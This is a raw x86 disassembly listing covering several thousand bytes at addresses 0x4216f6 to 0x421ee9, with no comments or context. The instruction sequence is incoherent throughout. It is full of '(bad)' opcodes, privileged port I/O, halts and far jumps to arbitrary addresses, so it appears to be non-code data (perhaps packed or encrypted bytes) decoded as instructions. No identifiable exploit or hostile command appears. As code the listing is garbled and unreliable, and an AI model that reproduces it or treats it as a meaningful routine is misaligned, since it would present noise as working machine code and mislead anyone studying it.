  4216f6:	rol    BYTE PTR [ecx],0x76
  4216f9:	xor    BYTE PTR [edi],ch
  4216fb:	jmp    0x75616d75
  421700:	sub    dh,ch
  421702:	and    ah,cl
  421704:	inc    ebp
  421705:	cmp    ah,dl
  421707:	mov    eax,ds:0x9c1c4b9d
  42170c:	dec    esp
  42170d:	jmp    0x7c950f00
  421712:	xchg   BYTE PTR ds:[ebp+0x75],bl
  421716:	push   0xffffffcb
  421718:	sub    esp,DWORD PTR [edi-0x6b06cdc8]
  42171e:	(bad)  
  42171f:	out    dx,al
  421720:	test   BYTE PTR [edx],ah
  421722:	inc    ebp
  421723:	fdivr  st(1),st
  421725:	jl     0x421755
  421727:	sbb    edi,edx
  421729:	lods   al,BYTE PTR ds:[esi]
  42172a:	push   ebx
  42172b:	fwait
  42172c:	sar    BYTE PTR [edi],cl
  42172e:	adc    DWORD PTR [edi+0x69907f58],edx
  421734:	mov    eax,DWORD PTR [esi]
  421736:	out    0xb4,eax
  421738:	pop    esp
  421739:	lahf   
  42173a:	and    esi,DWORD PTR [ebx]
  42173c:	inc    edx
  42173d:	outs   dx,DWORD PTR ds:[esi]
  42173e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42173f:	sbb    edx,DWORD PTR [eax+0x2bb43db2]
  421745:	sbb    BYTE PTR [esp+eiz*4+0x13],dl
  421749:	cmp    esi,DWORD PTR [edi-0x3d97bfa4]
  42174f:	sahf   
  421750:	adc    eax,DWORD PTR [eax]
  421752:	call   0xf5e3:0x99a51b8d
  421759:	(bad)  
  42175b:	push   DWORD PTR [ecx+edi*4-0x41]
  42175f:	cmc    
  421760:	or     esp,DWORD PTR [edi]
  421762:	shl    DWORD PTR [ebp+0x6bf6a310],1
  421768:	hlt    
  421769:	ss inc esi
  42176b:	imul   edi,DWORD PTR [esi+0x1b],0xffffffd2
  42176f:	xchg   ebx,eax
  421770:	retf   0x9b84
  421773:	push   ss
  421774:	fsub   QWORD PTR [ecx-0x71]
  421777:	xor    edi,DWORD PTR [edi]
  421779:	mov    esi,0x5890dc8c
  42177e:	fist   WORD PTR [edx+0x1f667d8d]
  421784:	push   edi
  421785:	shl    BYTE PTR [edx],cl
  421787:	add    esp,DWORD PTR [esi+0x4b]
  42178a:	jo     0x4217ce
  42178c:	push   edi
  42178d:	push   ebp
  42178e:	jle    0x421751
  421790:	imul   ebp,edi,0xe
  421793:	loope  0x421797
  421795:	inc    esi
  421796:	mov    ds:0x38535e9c,al
  42179b:	in     eax,dx
  42179c:	pop    ss
  42179d:	std    
  42179e:	and    BYTE PTR [ebx+0x2],bl
  4217a1:	jb     0x42172c
  4217a3:	mov    ebx,0x53baffbf
  4217a8:	sub    BYTE PTR [ecx-0x23],dl
  4217ab:	and    cl,BYTE PTR [edi-0x5b7908fb]
  4217b1:	or     al,0x2c
  4217b3:	test   al,0xb
  4217b5:	push   0x5959ea77
  4217ba:	bnd jmp 0xa0b64d9
  4217c0:	pushf  
  4217c1:	and    al,0x6d
  4217c3:	sbb    eax,0x2c440c07
  4217c8:	mov    dl,0x2
  4217ca:	sub    ch,BYTE PTR [edx]
  4217cc:	mov    dl,0xb6
  4217ce:	and    DWORD PTR [ebx-0x21],ebp
  4217d1:	pop    ebx
  4217d2:	dec    edx
  4217d3:	sub    eax,DWORD PTR [ecx+edx*1-0x2d832cbf]
  4217da:	sub    ecx,edi
  4217dc:	loop   0x421825
  4217de:	das    
  4217df:	adc    eax,0x9cfac5cd
  4217e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217e5:	sbb    ah,dh
  4217e7:	sar    ecx,cl
  4217e9:	cmp    DWORD PTR [esi-0x28],edx
  4217ec:	div    BYTE PTR [edi+0x15]
  4217ef:	into   
  4217f0:	in     eax,0x24
  4217f2:	add    ebp,DWORD PTR [eax+ebp*1]
  4217f5:	add    BYTE PTR [edx+eiz*4-0x40],bl
  4217f9:	cmp    BYTE PTR [edi+0x23ff4612],0x2a
  421800:	mov    al,0x38
  421802:	mov    ds:0x3b537401,al
  421807:	inc    ebp
  421808:	add    dh,BYTE PTR [eax-0x704c67ab]
  42180e:	xor    eax,0xa1d35215
  421813:	ffreep st(7)
  421815:	pop    ebp
  421816:	pushf  
  421817:	xchg   ebx,eax
  421818:	rcr    DWORD PTR [eax+ebx*1],cl
  42181b:	outs   dx,BYTE PTR ds:[esi]
  42181c:	inc    edi
  42181d:	jo     0x42184f
  42181f:	scas   al,BYTE PTR es:[edi]
  421820:	add    edx,DWORD PTR [eax]
  421822:	lock xor bh,BYTE PTR [esi+ebp*4]
  421826:	(bad)  
  421827:	pop    ecx
  421828:	inc    edx
  421829:	stc    
  42182a:	rol    DWORD PTR [edi+0x2e],0x63
  42182e:	lods   eax,DWORD PTR ds:[esi]
  42182f:	rcr    bh,1
  421831:	ficomp DWORD PTR [ecx+0x277825cc]
  421837:	stc    
  421838:	sub    al,0x7
  42183a:	or     al,BYTE PTR [ebp-0x60cf7943]
  421840:	xchg   cl,bh
  421842:	rcr    eax,0xb3
  421845:	into   
  421846:	cld    
  421847:	mov    ecx,0xa189caff
  42184c:	vmread ebx,eax
  42184f:	sahf   
  421850:	inc    edx
  421851:	in     al,dx
  421852:	inc    edx
  421853:	ror    DWORD PTR [edx+0x4a],1
  421856:	lods   al,BYTE PTR ds:[esi]
  421857:	add    edx,ebx
  421859:	ins    BYTE PTR es:[edi],dx
  42185a:	mov    BYTE PTR [eax],bh
  42185c:	outs   dx,BYTE PTR ds:[esi]
  42185d:	mov    es,WORD PTR ds:0xd8865521
  421863:	mov    eax,ds:0xd0a45990
  421868:	psubsb mm5,QWORD PTR [esi]
  42186b:	jne    0x4218b4
  42186d:	cmc    
  42186e:	or     al,0x23
  421870:	cmp    al,BYTE PTR [eax]
  421872:	inc    esi
  421873:	(bad)  
  421875:	aad    0xed
  421877:	cmp    ah,dl
  421879:	lea    ecx,[edx-0x4e731341]
  42187f:	add    bl,BYTE PTR [ecx+ebx*2]
  421882:	inc    esi
  421883:	iret   
  421884:	mov    esp,0x61e09a8b
  421889:	and    DWORD PTR [ebx+0x3a],0xffffffc1
  42188d:	leave  
  42188e:	call   0xa4da:0x9e4cebe6
  421895:	xor    esp,DWORD PTR [edx-0x49]
  421898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421899:	sub    ebp,DWORD PTR [ecx+edi*4+0x62050e8b]
  4218a0:	scas   eax,DWORD PTR es:[edi]
  4218a1:	sbb    ch,BYTE PTR [ecx+0x57]
  4218a4:	ret    0xbe20
  4218a7:	aam    0x6a
  4218a9:	inc    edi
  4218aa:	in     eax,0xbe
  4218ac:	setbe  bh
  4218af:	xor    bh,BYTE PTR [ebp+0x2b]
  4218b2:	sub    al,0x42
  4218b4:	mov    eax,0xb1231af8
  4218b9:	jmp    0x4218f4
  4218bb:	cmp    bh,BYTE PTR [esi-0x3d333a2b]
  4218c1:	cmp    ecx,DWORD PTR [ecx-0x7]
  4218c4:	loop   0x421909
  4218c6:	push   esi
  4218c7:	aas    
  4218c8:	push   ss
  4218c9:	rcl    DWORD PTR [esi-0x6ff44d7a],cl
  4218cf:	in     al,dx
  4218d0:	(bad)  
  4218d1:	jmp    edx
  4218d3:	outs   dx,DWORD PTR ds:[esi]
  4218d4:	js     0x4218aa
  4218d6:	mov    ds:0xa52e33d1,eax
  4218db:	aas    
  4218dc:	enter  0x7c68,0x60
  4218e0:	xchg   ecx,eax
  4218e1:	into   
  4218e2:	pop    es
  4218e3:	jbe    0x421881
  4218e5:	jb     0x421932
  4218e7:	daa    
  4218e8:	pop    ecx
  4218e9:	sbb    bl,dl
  4218eb:	ja     0x4218bd
  4218ed:	pusha  
  4218ee:	cli    
  4218ef:	scas   eax,DWORD PTR es:[edi]
  4218f0:	add    eax,0x816e2cda
  4218f5:	mov    ebp,0x9b406713
  4218fa:	xchg   edi,eax
  4218fb:	hlt    
  4218fc:	pop    es
  4218fd:	jecxz  0x42193c
  4218ff:	inc    ecx
  421900:	or     eax,0xa18b502b
  421905:	repz fs daa 
  421908:	addr16 sub esi,edx
  42190b:	dec    ebp
  42190c:	adc    eax,DWORD PTR [edi+0x15]
  42190f:	std    
  421910:	sahf   
  421911:	icebp  
  421912:	rcr    edi,cl
  421914:	fdivp  st(4),st
  421916:	sub    dl,0x6e
  421919:	add    ah,BYTE PTR [edi+ecx*1-0x3]
  42191d:	xor    eax,0x14f74741
  421922:	xor    bl,cl
  421924:	(bad)  
  421925:	frstor [eax+0xc412877]
  42192b:	sbb    edi,esi
  42192d:	out    0xcd,al
  42192f:	inc    ebx
  421930:	xor    DWORD PTR [eax-0x16],0x34
  421934:	lahf   
  421935:	ret    0xefec
  421938:	fsubr  DWORD PTR [edx+0x9]
  42193b:	rol    BYTE PTR [edx+esi*1],0xe
  42193f:	daa    
  421940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421941:	pop    ebx
  421942:	test   bl,bh
  421944:	pusha  
  421945:	hlt    
  421946:	idiv   BYTE PTR [ecx]
  421948:	in     eax,0x3f
  42194a:	and    al,0xcf
  42194c:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42194e:	lods   al,BYTE PTR ds:[esi]
  42194f:	xchg   esp,eax
  421950:	sbb    eax,0x378afccb
  421955:	(bad)  [ebp+0x6b326b77]
  42195b:	dec    ecx
  42195c:	into   
  42195d:	pop    es
  42195e:	add    ebp,ebx
  421960:	pop    ebp
  421961:	xor    al,0x2e
  421963:	or     eax,0xa5f92978
  421968:	cmc    
  421969:	and    BYTE PTR [ebp-0x47],bl
  42196c:	dec    ecx
  42196d:	xchg   ecx,eax
  42196e:	cld    
  42196f:	push   esi
  421970:	scas   al,BYTE PTR es:[edi]
  421971:	call   DWORD PTR [ebp-0x2c3da88]
  421977:	xor    al,0xf9
  421979:	jbe    0x4218fd
  42197b:	out    0xe5,eax
  42197d:	mov    eax,0x7152fe3e
  421982:	hlt    
  421983:	mov    eax,ds:0xa0a2ec5c
  421988:	mov    esp,0xd8b7b5e0
  42198d:	mov    al,ds:0xa0009e66
  421992:	add    ebp,DWORD PTR [edx-0x4ce5c54b]
  421998:	dec    ecx
  421999:	lds    edi,FWORD PTR [eax+0x44]
  42199c:	jle    0x421954
  42199e:	mov    eax,0x5d0368ed
  4219a3:	xor    DWORD PTR [esi+ebx*1+0x44],0x67
  4219a8:	int    0x11
  4219aa:	std    
  4219ab:	or     edx,esp
  4219ad:	inc    edi
  4219ae:	push   esi
  4219af:	retf   0xe58a
  4219b2:	and    DWORD PTR ds:0x5889db18,ebx
  4219b8:	mov    edi,0x67faa66e
  4219bd:	pop    ds
  4219be:	fld    QWORD PTR [esi+0x44]
  4219c1:	push   es
  4219c2:	pop    esi
  4219c3:	pop    esp
  4219c4:	jg     0x421a02
  4219c6:	call   0x2984af24
  4219cb:	push   ebx
  4219cc:	aas    
  4219cd:	and    al,0x50
  4219cf:	je     0x4219b4
  4219d1:	sbb    al,0xdb
  4219d3:	push   eax
  4219d4:	aas    
  4219d5:	sbb    BYTE PTR [ebx-0x37],ah
  4219d8:	cdq    
  4219d9:	stc    
  4219da:	sub    al,0xdd
  4219dc:	fcom   QWORD PTR [edx+0x6081f4eb]
  4219e2:	aad    0x4e
  4219e4:	sldt   WORD PTR [edx+eax*1-0x38]
  4219e9:	xlat   BYTE PTR ds:[ebx]
  4219ea:	inc    edx
  4219eb:	add    DWORD PTR [edi],edx
  4219ed:	jmp    0xd1bc:0x1abb6676
  4219f4:	shl    BYTE PTR [eax],0x67
  4219f7:	sub    ebp,ebx
  4219f9:	and    al,0xd1
  4219fb:	jmp    0xe7378ed9
  421a00:	out    0xe1,al
  421a02:	add    eax,0xdc2830a8
  421a07:	inc    ebp
  421a08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a09:	imul   ebx,DWORD PTR ds:0xbb02d95f,0x3ba9b4d2
  421a13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a14:	add    dl,dl
  421a16:	dec    ebx
  421a17:	scas   eax,DWORD PTR es:[edi]
  421a18:	sub    eax,0xe51db0b5
  421a1d:	test   BYTE PTR [eax+0x7e7e2259],0x2e
  421a24:	xchg   BYTE PTR [ecx+0x720d1a4d],ch
  421a2a:	or     eax,0xe9ed05f8
  421a2f:	clc    
  421a30:	(bad)  
  421a31:	push   eax
  421a32:	fcomp  QWORD PTR [edi+0x70]
  421a35:	stc    
  421a36:	loope  0x421a90
  421a38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a39:	adc    dl,BYTE PTR [edi-0x1b43a870]
  421a3f:	mov    ebp,0xb7c2dcb2
  421a44:	out    0x56,eax
  421a46:	push   0xdd5043d0
  421a4b:	sbb    DWORD PTR [edi],ebx
  421a4d:	(bad)  
  421a4f:	test   eax,0xfe86c89e
  421a54:	enter  0x830b,0x56
  421a58:	push   0xf0eba980
  421a5d:	mov    edi,gs
  421a5f:	popa   
  421a60:	xor    DWORD PTR [eax+0x4972e03a],esi
  421a66:	je     0x421a73
  421a68:	shl    BYTE PTR ds:0xcaa25615,0x88
  421a6f:	push   edi
  421a70:	fmul   DWORD PTR [edx]
  421a72:	rcl    DWORD PTR [esi],0xfa
  421a75:	dec    ecx
  421a76:	(bad)  
  421a77:	jmp    0xa9b0:0x8fbebc0b
  421a7e:	cs ret 0x3ec5
  421a82:	cmp    dl,cl
  421a84:	mov    dl,0x42
  421a86:	xor    ecx,DWORD PTR [esi+0x5b5401b0]
  421a8c:	mov    al,0xbb
  421a8e:	mov    al,0x3e
  421a90:	or     BYTE PTR [edx+0x48],cl
  421a93:	das    
  421a94:	xchg   esi,eax
  421a95:	stc    
  421a96:	xor    BYTE PTR [ebx+0x1ec90bcb],0xc0
  421a9d:	in     eax,dx
  421a9e:	int3   
  421a9f:	ja     0x421a9e
  421aa1:	mov    DWORD PTR [esi],esi
  421aa3:	loopne 0x421aa5
  421aa5:	add    eax,0x290d345
  421aaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421aab:	mov    DWORD PTR [ebx],ebp
  421aad:	cwde   
  421aae:	ds mov cl,0xec
  421ab1:	and    al,0xe
  421ab3:	popf   
  421ab4:	mov    BYTE PTR [edi],ch
  421ab6:	push   edx
  421ab7:	cmp    dh,BYTE PTR [ecx+0x4f272ae0]
  421abd:	(bad)  
  421abe:	lock js 0x421ac4
  421ac1:	ins    DWORD PTR es:[edi],dx
  421ac2:	push   ss
  421ac3:	mov    bl,0xd
  421ac5:	push   ss
  421ac6:	(bad)  
  421ac7:	repz imul esi,DWORD PTR [ebp-0x7b605bbb],0xbb2d3a84
  421ad2:	push   DWORD PTR [esi-0x35]
  421ad5:	test   eax,0xbc75d495
  421ada:	cmc    
  421adb:	push   edi
  421adc:	loopne 0x421a88
  421ade:	jb     0x421b22
  421ae0:	jns    0x421ac7
  421ae2:	pop    es
  421ae3:	test   al,0xfd
  421ae5:	jecxz  0x421b46
  421ae7:	pop    esp
  421ae8:	popf   
  421ae9:	repnz or al,0x3
  421aec:	add    cl,BYTE PTR [ebx+0x24]
  421aef:	lods   eax,DWORD PTR ds:[esi]
  421af0:	mov    esi,0x54161b1e
  421af5:	je     0x421b68
  421af7:	lods   eax,DWORD PTR ds:[esi]
  421af8:	ss mov bl,0x4e
  421afb:	cmpps  xmm6,XMMWORD PTR [ebp-0x380a9c81],0xb5
  421b03:	ins    DWORD PTR es:[edi],dx
  421b04:	ficom  DWORD PTR [ebx]
  421b06:	and    al,0x84
  421b08:	mov    dh,0xce
  421b0a:	inc    ebp
  421b0b:	mov    ah,0x87
  421b0d:	sar    BYTE PTR [ebx-0x59e240a0],1
  421b13:	push   0xffffffec
  421b15:	sbb    al,0xd6
  421b17:	retf   
  421b18:	loope  0x421b68
  421b1a:	leave  
  421b1b:	out    0x40,al
  421b1d:	retf   0xf12
  421b20:	shr    BYTE PTR ds:0xed686f38,1
  421b26:	add    al,0x4e
  421b28:	call   0xb0fa:0x6c1e72fe
  421b2f:	std    
  421b30:	or     bl,BYTE PTR [edi-0x7a83809b]
  421b36:	imul   ecx,DWORD PTR [edx],0x29134b3e
  421b3c:	xchg   esi,eax
  421b3d:	jb     0x421b1a
  421b3f:	push   eax
  421b40:	dec    ebx
  421b41:	cmp    BYTE PTR [ecx-0x4e0b3bd],dh
  421b47:	rcr    ch,0x41
  421b4a:	lods   al,BYTE PTR ds:[esi]
  421b4b:	js     0x421bb0
  421b4d:	jno    0x421b75
  421b4f:	xchg   esp,eax
  421b50:	repz or DWORD PTR [edx+0xd6fb8fa],esi
  421b57:	imul   esp,esp,0x38
  421b5a:	in     eax,0x3a
  421b5c:	add    eax,0xb17f8e1f
  421b61:	adc    edi,esi
  421b63:	pop    edx
  421b64:	sar    BYTE PTR [esi+0x49fc220f],0x2d
  421b6b:	jmp    0x892e:0xb6d4c6e6
  421b72:	mov    bh,0x72
  421b74:	jle    0x421ba8
  421b76:	lock in al,dx
  421b78:	pop    ss
  421b79:	ins    DWORD PTR es:[edi],dx
  421b7a:	aad    0xe8
  421b7c:	loop   0x421b87
  421b7e:	(bad)  
  421b7f:	repnz adc BYTE PTR [ebx+0x1e],dl
  421b83:	and    bh,dh
  421b85:	into   
  421b86:	adc    eax,0x4bba4276
  421b8b:	leave  
  421b8c:	xor    al,0xc9
  421b8e:	dec    esi
  421b8f:	mov    ds:0x652fc7c6,eax
  421b94:	xor    DWORD PTR [ebx+0x3900a963],esi
  421b9a:	stos   BYTE PTR es:[edi],al
  421b9b:	xor    eax,0xd5d6d46e
  421ba0:	adc    BYTE PTR [ecx+0x5e],bh
  421ba3:	test   DWORD PTR [esi-0x5f],ebp
  421ba6:	dec    ecx
  421ba7:	push   0xffffffb0
  421ba9:	mov    edx,0xff5f5dbd
  421bae:	dec    esp
  421baf:	adc    eax,0xcdc12ede
  421bb4:	cmp    ecx,0x28
  421bb7:	bound  esp,QWORD PTR ds:0x454ced30
  421bbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bbe:	call   0x64c8:0x8915926e
  421bc5:	in     al,0x94
  421bc7:	int3   
  421bc8:	bound  esp,QWORD PTR [edx]
  421bca:	mov    dh,0xca
  421bcc:	mov    eax,0xed9a8ee6
  421bd1:	fistp  WORD PTR [edi+0x5d20c69b]
  421bd7:	fisubr WORD PTR [eax-0x42]
  421bda:	ja     0x421be1
  421bdc:	mov    BYTE PTR [ecx+0x31],dl
  421bdf:	jns    0x421c4e
  421be1:	iret   
  421be2:	stos   DWORD PTR es:[edi],eax
  421be3:	or     eax,0xa6464f08
  421be8:	jae    0x421b83
  421bea:	jns    0x421be9
  421bec:	js     0x421c51
  421bee:	mov    ds:0x68bb15f4,eax
  421bf3:	retf   
  421bf4:	jmp    FWORD PTR [edx-0x28eed31]
  421bfa:	retf   0x86a0
  421bfd:	sar    bl,0xd7
  421c00:	fld    DWORD PTR [edi-0x6f]
  421c03:	mov    bl,0xc7
  421c05:	je     0x421bf9
  421c07:	mov    ah,0xeb
  421c09:	in     al,0x9
  421c0b:	fld    TBYTE PTR [esi+0x71c726bf]
  421c11:	push   0xffffff9c
  421c13:	fcomp  DWORD PTR [ecx-0x9]
  421c16:	int    0x8d
  421c18:	dec    edx
  421c19:	mov    ebx,0xaef816b1
  421c1e:	xchg   DWORD PTR [ebp+esi*2+0x2ab26893],ebp
  421c25:	pushf  
  421c26:	jb     0x421c5f
  421c28:	or     eax,0x914c6d2b
  421c2d:	(bad)  
  421c2e:	jne    0x421c81
  421c30:	dec    eax
  421c31:	or     BYTE PTR [ebp-0x1b],dl
  421c34:	enter  0xa521,0xef
  421c38:	mov    edi,0x162060ed
  421c3d:	enter  0x48ac,0xa4
  421c41:	in     eax,dx
  421c42:	add    eax,0x5eebbe3
  421c47:	jbe    0x421cb8
  421c49:	xchg   BYTE PTR [edx-0x1f],cl
  421c4c:	mov    ah,0xd0
  421c4e:	sub    cl,BYTE PTR [esi]
  421c50:	loop   0x421c6c
  421c52:	outs   dx,BYTE PTR ds:[esi]
  421c53:	pushf  
  421c54:	pop    eax
  421c55:	pop    esi
  421c56:	push   eax
  421c57:	inc    edx
  421c58:	popf   
  421c59:	sub    eax,0xc81638dc
  421c5e:	inc    ebx
  421c5f:	in     eax,dx
  421c60:	pop    eax
  421c61:	add    al,al
  421c63:	mov    bl,0x19
  421c65:	inc    esi
  421c66:	xchg   ecx,eax
  421c67:	push   esi
  421c68:	shl    BYTE PTR [edx-0x7f030bf5],1
  421c6e:	or     edi,DWORD PTR [eiz*2-0x2822e3f9]
  421c75:	test   DWORD PTR [ecx+edi*4],ebp
  421c78:	popa   
  421c79:	jp     0x421c58
  421c7b:	mov    DWORD PTR [eax],0xb91c1446
  421c81:	adc    eax,0xee0ff200
  421c86:	ficomp WORD PTR [ebp+0x72]
  421c89:	cmp    dl,dh
  421c8b:	cli    
  421c8c:	repz sub eax,0xd77eb916
  421c92:	xchg   edi,eax
  421c93:	add    cl,BYTE PTR ds:0x9bc06b9e
  421c99:	jbe    0x421c44
  421c9b:	xchg   ebp,eax
  421c9c:	ror    DWORD PTR [edx+0x7a],1
  421c9f:	xor    al,0x43
  421ca1:	fwait
  421ca2:	dec    edi
  421ca3:	jmp    0x57b7c277
  421ca8:	mov    ecx,0x605bdf11
  421cad:	ins    BYTE PTR es:[edi],dx
  421cae:	call   0x52c4:0x38df3de2
  421cb5:	lock sbb eax,DWORD PTR [esi+0x2e712ce0]
  421cbc:	(bad)  
  421cbd:	mov    ds:0x3f73db2a,al
  421cc2:	imul   ecx,DWORD PTR [ecx+eax*2-0x5],0xecf85f94
  421cca:	in     eax,dx
  421ccb:	inc    edx
  421ccc:	fsubr  st,st(5)
  421cce:	call   0x9ff6:0xbf39eb0f
  421cd5:	std    
  421cd6:	scas   al,BYTE PTR es:[edi]
  421cd7:	int3   
  421cd8:	cmc    
  421cd9:	add    dl,BYTE PTR [eax]
  421cdb:	jae    0x421ccc
  421cdd:	dec    ecx
  421cde:	sbb    BYTE PTR [edi-0x1176b44],0xe4
  421ce5:	nop
  421ce6:	mov    cl,0x9
  421ce8:	cs fmul st(7),st
  421ceb:	das    
  421cec:	xor    BYTE PTR [esi],cl
  421cee:	adc    esi,DWORD PTR [ecx-0x7b]
  421cf1:	inc    edx
  421cf2:	jmp    0x356e:0x73d3e7a4
  421cf9:	mov    eax,0x1017c478
  421cfe:	xchg   ebp,eax
  421cff:	imul   esp,ebx,0xffffff81
  421d02:	clc    
  421d03:	ins    DWORD PTR es:[edi],dx
  421d04:	test   BYTE PTR [eax-0x23],bl
  421d07:	in     al,dx
  421d08:	or     DWORD PTR [esi],ebx
  421d0a:	fmul   DWORD PTR [esi]
  421d0c:	ins    DWORD PTR es:[edi],dx
  421d0d:	je     0x421cba
  421d0f:	call   0x4bcf:0xf3433ccf
  421d16:	add    DWORD PTR [eax-0x10c09d39],edi
  421d1c:	aas    
  421d1d:	lds    ebx,FWORD PTR [esi+0x3df83d39]
  421d23:	lds    esi,FWORD PTR [ebx]
  421d25:	mov    ah,0xcd
  421d27:	mov    cl,0x2f
  421d29:	sub    eax,0xaf7e1dff
  421d2e:	add    ebx,DWORD PTR [edx+0x1e7d492f]
  421d34:	dec    edx
  421d35:	push   esp
  421d36:	je     0x421dac
  421d38:	call   0x8c31:0xbe1de723
  421d3f:	adc    BYTE PTR [ecx+0x32],cl
  421d42:	cmp    BYTE PTR [eax+0x3e],bh
  421d45:	sbb    BYTE PTR [ebx-0x28e9223a],ch
  421d4b:	pushf  
  421d4c:	dec    ecx
  421d4d:	jecxz  0x421db7
  421d4f:	test   eax,0x118a1249
  421d54:	or     esp,DWORD PTR [esi]
  421d56:	rcl    DWORD PTR [eax+0xfda4744],1
  421d5c:	pop    ds
  421d5d:	leave  
  421d5e:	mov    ecx,0xe152be00
  421d63:	bound  ecx,QWORD PTR [esi+0x31]
  421d66:	sbb    eax,DWORD PTR [esi+0x19981b71]
  421d6c:	imul   ebp,esp,0x1c491101
  421d72:	test   eax,0x60f80433
  421d77:	lods   al,BYTE PTR ds:[esi]
  421d78:	ja     0x421d8a
  421d7a:	imul   ebp,DWORD PTR [edx-0x4e],0x0
  421d7e:	shl    BYTE PTR [edx+eax*4],cl
  421d81:	lock retf 0xf688
  421d85:	lods   al,BYTE PTR ds:[esi]
  421d86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d87:	fwait
  421d88:	ja     0x421d39
  421d8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d8b:	push   ebx
  421d8c:	pop    ss
  421d8d:	pop    ds
  421d8e:	add    edx,DWORD PTR [edi+0x365de666]
  421d94:	xchg   ebp,eax
  421d95:	mov    ch,0xb
  421d97:	adc    dh,BYTE PTR [eax+edx*1]
  421d9a:	imul   edi,DWORD PTR [eax-0x6a3d01b],0xffffff8a
  421da1:	xchg   esp,eax
  421da2:	jle    0x421db7
  421da4:	aaa    
  421da5:	sub    esi,DWORD PTR [ecx]
  421da7:	fdivr  DWORD PTR [ebx-0x80]
  421daa:	and    eax,0xed2109cc
  421db0:	push   ss
  421db1:	lahf   
  421db2:	or     edx,ebx
  421db4:	add    ebx,ecx
  421db6:	frstor [eax-0x14]
  421db9:	mov    ah,bl
  421dbb:	add    ebx,DWORD PTR [ecx]
  421dbd:	bound  ebp,QWORD PTR [edi-0x7e]
  421dc0:	hlt    
  421dc1:	clc    
  421dc2:	inc    ecx
  421dc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dc4:	pusha  
  421dc5:	sahf   
  421dc6:	xchg   edi,eax
  421dc7:	(bad)  
  421dc8:	sub    al,0x21
  421dca:	arpl   WORD PTR [edi+0x50],dx
  421dcd:	push   esi
  421dce:	push   0x74e7972
  421dd3:	mov    WORD PTR [eax+ecx*4+0x4c],?
  421dd7:	es mov edi,0xcd196ea2
  421ddd:	inc    edx
  421dde:	repz add BYTE PTR [edi],dl
  421de1:	fstp   TBYTE PTR [eax+eax*2]
  421de4:	and    al,0x73
  421de6:	shl    DWORD PTR [edi-0x46f1b4d7],1
  421dec:	cmp    edi,DWORD PTR [edx]
  421dee:	jmp    0x2bf4aa71
  421df3:	mov    al,ds:0xdd2a1aa
  421df8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421df9:	shl    BYTE PTR [ebp+0x1c],1
  421dfc:	sbb    BYTE PTR [esi],ch
  421dfe:	push   ebp
  421dff:	out    0xd3,eax
  421e01:	or     al,0xcf
  421e03:	mov    gs,ebx
  421e05:	adc    bh,BYTE PTR [edx+ebp*4+0x62]
  421e09:	jmp    FWORD PTR cs:[edi+0x58]
  421e0d:	or     edx,esp
  421e0f:	aad    0x9a
  421e11:	and    eax,0x1f4ddb4a
  421e16:	mov    edx,0x169a5bc6
  421e1b:	dec    ecx
  421e1c:	mov    edx,0xef4db6ef
  421e21:	cmp    DWORD PTR [eax],0xffffffd9
  421e24:	icebp  
  421e25:	lahf   
  421e26:	leave  
  421e27:	push   es
  421e28:	fwait
  421e29:	retf   0x50f7
  421e2c:	add    DWORD PTR [edx-0x2b],esi
  421e2f:	mov    ebp,0x75e2ff96
  421e34:	ror    DWORD PTR [ebp+0x13],1
  421e37:	addr16 mov ds:0xa56a,al
  421e3b:	sbb    eax,0x11c22207
  421e40:	js     0x421ead
  421e42:	test   DWORD PTR [ecx+edi*4],ecx
  421e45:	adc    bh,BYTE PTR [edx-0x1399f269]
  421e4b:	sub    ebx,DWORD PTR [edi-0x4a]
  421e4e:	lahf   
  421e4f:	jne    0x421e73
  421e51:	rol    cl,cl
  421e53:	fsubp  st(4),st
  421e55:	xchg   ebx,eax
  421e56:	ins    BYTE PTR es:[edi],dx
  421e57:	inc    edx
  421e58:	repz and esp,edi
  421e5b:	mov    ebp,0x126e7aa4
  421e60:	or     BYTE PTR [edi],bl
  421e62:	mov    ds,WORD PTR [ecx+0x13d795ef]
  421e68:	sbb    eax,0x54023dd1
  421e6d:	pop    ds
  421e6e:	mov    al,ds:0xccc435bf
  421e73:	and    esp,ebp
  421e75:	add    dh,BYTE PTR [edx+ebp*2-0x20a15908]
  421e7c:	jne    0x421ee7
  421e7e:	cdq    
  421e7f:	aam    0xd5
  421e81:	aam    0x7b
  421e83:	push   ebp
  421e84:	mov    al,ds:0x2dc33949
  421e89:	mov    eax,0xb549cef8
  421e8e:	xlat   BYTE PTR ds:[ebx]
  421e8f:	packssdw mm3,mm1
  421e92:	xchg   DWORD PTR ds:0x55aa650f,edi
  421e98:	push   0xa1044d10
  421e9d:	(bad)  
  421e9e:	jl     0x421ecf
  421ea0:	or     DWORD PTR [ecx-0x3cfbfe27],ebp
  421ea6:	lods   eax,DWORD PTR ds:[esi]
  421ea7:	dec    ebp
  421ea8:	aas    
  421ea9:	xor    bh,bh
  421eab:	pop    edx
  421eac:	or     edx,esi
  421eae:	repz popa 
  421eb0:	sub    BYTE PTR [ecx-0x571d76c6],0xc8
  421eb7:	mov    dh,0x35
  421eb9:	and    DWORD PTR [eax],ebx
  421ebb:	sub    esi,DWORD PTR [esi]
  421ebd:	jp     0x421eae
  421ebf:	idiv   DWORD PTR [ecx+0x89d1736]
  421ec5:	xchg   ebx,eax
  421ec6:	jecxz  0x421e87
  421ec8:	xor    al,0xfe
  421eca:	jns    0x421ed2
  421ecc:	out    dx,al
  421ecd:	mov    ebp,0x1ae7a469
  421ed2:	mov    ch,0xb0
  421ed4:	mov    dl,0xf7
  421ed6:	leave  
  421ed7:	call   0xb029:0xe1c1a0e6
  421ede:	mov    dl,0x25
  421ee0:	inc    edx
  421ee1:	fld    QWORD PTR [ecx+0x34561eba]
  421ee7:	jns    0x421ec4
  421ee9:	aam    0x91
